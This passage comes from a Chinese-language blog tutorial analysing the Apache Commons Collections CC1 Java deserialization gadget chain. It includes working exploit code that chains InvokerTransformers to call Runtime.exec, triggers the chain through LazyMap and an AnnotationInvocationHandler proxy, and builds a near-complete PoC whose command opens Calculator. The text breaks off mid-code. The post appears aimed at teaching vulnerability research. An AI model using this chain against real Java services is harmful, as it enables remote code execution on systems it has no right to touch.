class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">          <span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, </span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">        ),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">      ),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, </span><br><span class="line">        execArgs</span><br><span class="line">      ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="构造transformers"><a href="#构造transformers" class="headerlink" title="构造transformers"></a>构造transformers</h3><p>综合前面的前置知识，可以知道前半部分先构造了一个<code>transformers</code>链</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-hy5kk4lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-hy5kk4lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Transformer[]</span></span><br><span class="line"><span class="comment">    Runtime.getRuntime().exec(&quot;xxx&quot;);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Runtime.class.getMethod(&quot;exec&quot;, String.class)</span></span><br><span class="line"><span class="comment">     .invoke(</span></span><br><span class="line"><span class="comment">        Runtime.class.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line"><span class="comment">            .invoke(Runtime.class),</span></span><br><span class="line"><span class="comment">        &quot;open -a Calculator&quot;</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;open -a Calculator&quot;</span> &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="寻找漏洞触发点"><a href="#寻找漏洞触发点" class="headerlink" title="寻找漏洞触发点"></a>寻找漏洞触发点</h3><blockquote><p>前面只是构造了 transformers 链，还需要找到一个<code>transform()</code>方法将其触发</p></blockquote><p>接着下面创建了一个<code>HashMap</code>实例，然后调用<code>LazyMap.decorate()</code>方法，跟进后发现调用了<code>LazyMap</code>的构造函数，传入的<code>Transformer</code>赋值给<code>this.factory</code>。并且该类的构造函数为<code>proteccted</code>，因此不能直接调用。</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-6.png" data-caption="Java安全漫谈-CC1篇-6"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-6.png" alt="Java安全漫谈-CC1篇-6"></a></p><p>在该类中搜索<code>this.factory</code>，发现在<code>LazyMap#get()</code>方法中触发了<code>transform()</code>，前提是传入的<code>key</code>不在 Map 中</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-7.png" data-caption="Java安全漫谈-CC1篇-7"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-7.png" alt="Java安全漫谈-CC1篇-7"></a></p><p>需要注意的是，这里调用<code>LazyMap.decorate()</code>方法时所传入的参数类型是<code>Map</code>和<code>Transformer</code>对象，而不能直接传入前面所构造的<code>Transformer[]</code>数组，因此这里还构造了一个<code>ChainedTransformer</code>对象。</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-8.png" data-caption="Java安全漫谈-CC1篇-8"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-8.png" alt="Java安全漫谈-CC1篇-8"></a></p><p>这里构造对象时，作者在创建了一个新的<code>Transformer[]</code>对象传入，而不是直接传入所构造的<code>transformers</code>调用链。<strong>目的是为了避免本地调试时触发命令执行</strong></p><blockquote><p>P牛在《Java安全漫谈》中也有相应的解释：<br>为了避免本地调试时触发命令执⾏，我构造 LazyMap 的时候先⽤了⼀个⼈畜⽆害的 fakeTransformers 对象，等最后要⽣成 Payload 的时候，再把真正的 transformers 替换进去。</p></blockquote><p>如果直接传入<code>transformers</code>，并调用<code>LazyMap#get()</code>一个不存在的<code>key</code>。这样运行后就会直接触发恶意代码，弹出计算器。示例如下：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-d7o0wwlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-d7o0wwlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// final Transformer transformerChain = new ChainedTransformer(</span></span><br><span class="line">        <span class="comment">//     new Transformer[]&#123; new ConstantTransformer(1) &#125;</span></span><br><span class="line">        <span class="comment">// );</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;open -a Calculator&quot;</span> &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        lazyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><blockquote><p>上⾯的代码执⾏示例代码只是⼀个⽤来在本地测试的类。在实际反序列化中，需要找到一个类，<strong>在它进行反序列化时，</strong><code>**readObject()**</code><strong>中也存在</strong><code>**get()**</code><strong>方法</strong></p></blockquote><p>继续往下看，跟进<code>Gadgets</code>类后可以看到，这里使用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>创建了实例</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-9.png" data-caption="Java安全漫谈-CC1篇-9"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-9.png" alt="Java安全漫谈-CC1篇-9"></a></p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-10.png" data-caption="Java安全漫谈-CC1篇-10"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-10.png" alt="Java安全漫谈-CC1篇-10"></a></p><p>继续跟进<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，发现该类中的<code>invoke()</code>方法触发了<code>get()</code></p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-11.png" data-caption="Java安全漫谈-CC1篇-11"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-11.png" alt="Java安全漫谈-CC1篇-11"></a></p><p>但<code>readObject()</code>和<code>invoke()</code>中的<code>get()</code>方法有什么联系呢，或者说应该如何才能触发<code>invoke()</code>方法呢，此时就需要用到了 Java 动态代理<br>这里的<code>AnnotationInvocationHandler</code>其实继承了<code>InvocationHandler</code>，也就是说用<code>AnnotationInvocationHandler</code>对<code>LazyMap</code>对象进行代理，那么在<code>readObject</code>的时候，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler#invoke</code>方法中，进而触发我们的<code>LazyMap#get</code></p><h3 id="最后的反射"><a href="#最后的反射" class="headerlink" title="最后的反射"></a>最后的反射</h3><p>上文也说了，为了避免本地调试时触发命令执行，作者在构造了<code>ChainedTransformer</code>对象时，创建了一个新的<code>Transformer[]</code>对象传入，但是这个对象并没有恶意代码。所以这里还需要通过反射将真正恶意的<code>transformers</code>链替换进去：</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-12.png" data-caption="Java安全漫谈-CC1篇-12"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-12.png" alt="Java安全漫谈-CC1篇-12"></a></p><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>综上所述：</p><ul><li>构造<code>transformers</code>，主要通过<code>transformer</code>调用链实现反射触发恶意代码</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-2eo7j5lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-2eo7j5lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;open -a Calculator&quot;</span> &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>创建<code>LazyMap</code></li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-58jf9ylr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-58jf9ylr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>实例化代理对象。这里不能直接<code>new</code>对象，需要通过反射获取<code>AnnotationInvocationHandler</code>构造函数进行构造。</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-nyqt0slr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-nyqt0slr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过反射获取 AnnotationInvocationHandler 构造函数</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annoConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用构造函数实例化,创建与 lazyMap 关联的 InvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">lazyMapHandler</span> <span class="operator">=</span> (InvocationHandler) annoConstructor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化代理对象,proxyMap 调用的方法都会被转发 InvocationHandler#invoke 方法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">    Map.class.getClassLoader(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">    lazyMapHandler</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>这里的<code>proxyMap</code>类型是<code>Map</code>，不能直接对其进行序列化，因为入口点是 <code>AnnotationInvocationHandler#readObject</code>，所以需要用<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行包裹</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-2zshoklr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-2zshoklr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 AnnotationInvocationHandler 对 proxyMap 重新包裹</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">proxyMapHandler</span> <span class="operator">=</span> (InvocationHandler) annoConstructor.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>需要分清上面<code>lazyMapHandler</code>和<code>proxyMapHandler</code>两个<code>Handler</code>：<br>第一个<code>lazyMapHandler</code>是用于实例化代理对象，当调用代理对象的方法时会被转发到<code>invoke()</code>，从而触发<code>LazyMap</code>中的<code>get()</code>方法<br>第二个<code>proxyMapHandler</code>是为了执行代理类<code>proxyMap</code>的任意方法，从而触发第一处的<code>invoke()</code>方法</p><p>完整代码如下：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-526078lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-526078lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;open -a Calculator&quot;</span> &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">// lazyMap.get(&quot;test&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射获取 AnnotationInvocationHandler 构造函数</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annoConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 